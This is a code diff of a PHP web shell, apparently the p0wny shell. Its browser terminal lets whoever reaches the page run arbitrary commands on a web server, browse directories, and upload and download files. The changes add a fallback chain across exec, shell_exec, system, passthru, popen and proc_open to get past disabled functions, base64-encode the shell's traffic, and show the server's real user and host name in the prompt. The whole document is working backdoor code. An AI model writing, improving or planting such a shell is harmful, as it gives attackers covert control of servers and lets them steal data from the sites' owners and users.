@@ -1,31 +1,88 @@
 <?php
 
-function featureShell($cmd, $cwd) {
-    $stdout = array();
+$SHELL_CONFIG = array(
+    'username' => 'p0wny',
+    'hostname' => 'shell',
+);
 
-    if (preg_match("/^\s*cd\s*$/", $cmd)) {
-        // pass
+function expandPath($path) {
+    if (preg_match("#^(~[a-zA-Z0-9_.-]*)(/.*)?$#", $path, $match)) {
+        exec("echo $match[1]", $stdout);
+        return $stdout[0] . $match[2];
+    }
+    return $path;
+}
+
+function allFunctionExist($list = array()) {
+    foreach ($list as $entry) {
+        if (!function_exists($entry)) {
+            return false;
+        }
+    }
+    return true;
+}
+
+function executeCommand($cmd) {
+    $output = '';
+    if (function_exists('exec')) {
+        exec($cmd, $output);
+        $output = implode("\n", $output);
+    } else if (function_exists('shell_exec')) {
+        $output = shell_exec($cmd);
+    } else if (allFunctionExist(array('system', 'ob_start', 'ob_get_contents', 'ob_end_clean'))) {
+        ob_start();
+        system($cmd);
+        $output = ob_get_contents();
+        ob_end_clean();
+    } else if (allFunctionExist(array('passthru', 'ob_start', 'ob_get_contents', 'ob_end_clean'))) {
+        ob_start();
+        passthru($cmd);
+        $output = ob_get_contents();
+        ob_end_clean();
+    } else if (allFunctionExist(array('popen', 'feof', 'fread', 'pclose'))) {
+        $handle = popen($cmd, 'r');
+        while (!feof($handle)) {
+            $output .= fread($handle, 4096);
+        }
+        pclose($handle);
+    } else if (allFunctionExist(array('proc_open', 'stream_get_contents', 'proc_close'))) {
+        $handle = proc_open($cmd, array(0 => array('pipe', 'r'), 1 => array('pipe', 'w')), $pipes);
+        $output = stream_get_contents($pipes[1]);
+        proc_close($handle);
+    }
+    return $output;
+}
+
+function isRunningWindows() {
+    return stripos(PHP_OS, "WIN") === 0;
+}
+
+function featureShell($cmd, $cwd) {
+    $stdout = "";
+
+    if (preg_match("/^\s*cd\s*(2>&1)?$/", $cmd)) {
+        chdir(expandPath("~"));
     } elseif (preg_match("/^\s*cd\s+(.+)\s*(2>&1)?$/", $cmd)) {
         chdir($cwd);
         preg_match("/^\s*cd\s+([^\s]+)\s*(2>&1)?$/", $cmd, $match);
-        chdir($match[1]);
+        chdir(expandPath($match[1]));
     } elseif (preg_match("/^\s*download\s+[^\s]+\s*(2>&1)?$/", $cmd)) {
         chdir($cwd);
         preg_match("/^\s*download\s+([^\s]+)\s*(2>&1)?$/", $cmd, $match);
         return featureDownload($match[1]);
     } else {
         chdir($cwd);
-        exec($cmd, $stdout);
+        $stdout = executeCommand($cmd);
     }
 
     return array(
-        "stdout" => $stdout,
-        "cwd" => getcwd()
+        "stdout" => base64_encode($stdout),
+        "cwd" => base64_encode(getcwd())
     );
 }
 
 function featurePwd() {
-    return array("cwd" => getcwd());
+    return array("cwd" => base64_encode(getcwd()));
 }
 
 function featureHint($fileName, $cwd, $type) {
@@ -37,6 +94,9 @@ function featureHint($fileName, $cwd, $type) {
     }
     $cmd = "/bin/bash -c \"$cmd\"";
     $files = explode("\n", shell_exec($cmd));
+    foreach ($files as &$filename) {
+        $filename = base64_encode($filename);
+    }
     return array(
         'files' => $files,
     );
@@ -46,12 +106,12 @@ function featureDownload($filePath) {
     $file = @file_get_contents($filePath);
     if ($file === FALSE) {
         return array(
-            'stdout' => array('File not found / no read permission.'),
-            'cwd' => getcwd()
+            'stdout' => base64_encode('File not found / no read permission.'),
+            'cwd' => base64_encode(getcwd())
         );
     } else {
         return array(
-            'name' => basename($filePath),
+            'name' => base64_encode(basename($filePath)),
             'file' => base64_encode($file)
         );
     }
@@ -62,16 +122,37 @@ function featureUpload($path, $file, $cwd) {
     $f = @fopen($path, 'wb');
     if ($f === FALSE) {
         return array(
-            'stdout' => array('Invalid path / no write permission.'),
-            'cwd' => getcwd()
+            'stdout' => base64_encode('Invalid path / no write permission.'),
+            'cwd' => base64_encode(getcwd())
         );
     } else {
         fwrite($f, base64_decode($file));
         fclose($f);
         return array(
-            'stdout' => array('Done.'),
-            'cwd' => getcwd()
+            'stdout' => base64_encode('Done.'),
+            'cwd' => base64_encode(getcwd())
         );
+    }
+}
+
+function initShellConfig() {
+    global $SHELL_CONFIG;
+
+    if (isRunningWindows()) {
+        $username = getenv('USERNAME');
+        if ($username !== false) {
+            $SHELL_CONFIG['username'] = $username;
+        }
+    } else {
+        $pwuid = posix_getpwuid(posix_geteuid());
+        if ($pwuid !== false) {
+            $SHELL_CONFIG['username'] = $pwuid['name'];
+        }
+    }
+
+    $hostname = gethostname();
+    if ($hostname !== false) {
+        $SHELL_CONFIG['hostname'] = $hostname;
     }
 }
 
@@ -100,6 +181,8 @@ if (isset($_GET["feature"])) {
     header("Content-Type: application/json");
     echo json_encode($response);
     die();
+} else {
+    initShellConfig();
 }
 
 ?><!DOCTYPE html>
@@ -117,6 +200,9 @@ if (isset($_GET["feature"])) {
                 background: #333;
                 color: #eee;
                 font-family: monospace;
+                width: 100vw;
+                height: 100vh;
+                overflow: hidden;
             }
 
             *::-webkit-scrollbar-track {
@@ -137,17 +223,21 @@ if (isset($_GET["feature"])) {
 
             #shell {
                 background: #222;
-                max-width: 800px;
-                margin: 50px auto 0 auto;
                 box-shadow: 0 0 5px rgba(0, 0, 0, .3);
                 font-size: 10pt;
                 display: flex;
                 flex-direction: column;
                 align-items: stretch;
+                max-width: calc(100vw - 2 * var(--shell-margin));
+                max-height: calc(100vh - 2 * var(--shell-margin));
+                resize: both;
+                overflow: hidden;
+                width: 100%;
+                height: 100%;
+                margin: var(--shell-margin) auto;
             }
 
             #shell-content {
-                height: 500px;
                 overflow: auto;
                 padding: 5px;
                 white-space: pre-wrap;
@@ -160,20 +250,27 @@ if (isset($_GET["feature"])) {
                 text-align: center;
             }
 
-            @media (max-width: 991px) {
+            :root {
+                --shell-margin: 25px;
+            }
+
+            @media (min-width: 1200px) {
+                :root {
+                    --shell-margin: 50px !important;
+                }
+            }
+
+            @media (max-width: 991px),
+                   (max-height: 600px) {
                 #shell-logo {
                     font-size: 6px;
                     margin: -25px 0;
                 }
-
-                html, body, #shell {
-                    height: 100%;
-                    width: 100%;
-                    max-width: none;
+                :root {
+                    --shell-margin: 0 !important;
                 }
-
                 #shell {
-                    margin-top: 0;
+                    resize: none;
                 }
             }
 
@@ -202,6 +299,7 @@ if (isset($_GET["feature"])) {
                 display: flex;
                 box-shadow: 0 -1px 0 rgba(0, 0, 0, .3);
                 border-top: rgba(255, 255, 255, .05) solid 1px;
+                padding: 10px 0;
             }
 
             #shell-input > label {
@@ -222,6 +320,7 @@ if (isset($_GET["feature"])) {
                 font-size: 10pt;
                 width: 100%;
                 align-self: center;
+                box-sizing: border-box;
             }
 
             #shell-input div {
@@ -235,6 +334,7 @@ if (isset($_GET["feature"])) {
         </style>
 
         <script>
+            var SHELL_CONFIG = <?php echo json_encode($SHELL_CONFIG); ?>;
             var CWD = null;
             var commandHistory = [];
             var historyPosition = 0;
@@ -269,10 +369,10 @@ if (isset($_GET["feature"])) {
                 } else {
                     makeRequest("?feature=shell", {cmd: command, cwd: CWD}, function (response) {
                         if (response.hasOwnProperty('file')) {
-                            featureDownload(response.name, response.file)
+                            featureDownload(atob(response.name), response.file)
                         } else {
-                            _insertStdout(response.stdout.join("\n"));
-                            updateCwd(response.cwd);
+                            _insertStdout(atob(response.stdout));
+                            updateCwd(atob(response.cwd));
                         }
                     });
                 }
@@ -283,7 +383,9 @@ if (isset($_GET["feature"])) {
 
                 function _requestCallback(data) {
                     if (data.files.length <= 1) return;  // no completion
-
+                    data.files = data.files.map(function(file){
+                        return atob(file);
+                    });
                     if (data.files.length === 2) {
                         if (type === 'cmd') {
                             eShellCmdInput.value = data.files[0];
@@ -333,8 +435,8 @@ if (isset($_GET["feature"])) {
                     var promise = getBase64(element.files[0]);
                     promise.then(function (file) {
                         makeRequest('?feature=upload', {path: path, file: file, cwd: CWD}, function (response) {
-                            _insertStdout(response.stdout.join("\n"));
-                            updateCwd(response.cwd);
+                            _insertStdout(atob(response.stdout));
+                            updateCwd(atob(response.cwd));
                         });
                     }, function () {
                         _insertStdout('An unknown client-side error occurred.');
@@ -360,7 +462,7 @@ if (isset($_GET["feature"])) {
                     var splittedCwd = cwd.split("/");
                     shortCwd = "…/" + splittedCwd[splittedCwd.length-2] + "/" + splittedCwd[splittedCwd.length-1];
                 }
-                return "p0wny@shell:<span title=\"" + cwd + "\">" + shortCwd + "</span>#";
+                return SHELL_CONFIG["username"] + "@" + SHELL_CONFIG["hostname"] + ":<span title=\"" + cwd + "\">" + shortCwd + "</span>#";
             }
 
             function updateCwd(cwd) {
@@ -370,7 +472,7 @@ if (isset($_GET["feature"])) {
                     return;
                 }
                 makeRequest("?feature=pwd", {}, function(response) {
-                    CWD = response.cwd;
+                    CWD = atob(response.cwd);
                     _updatePrompt();
                 });
 
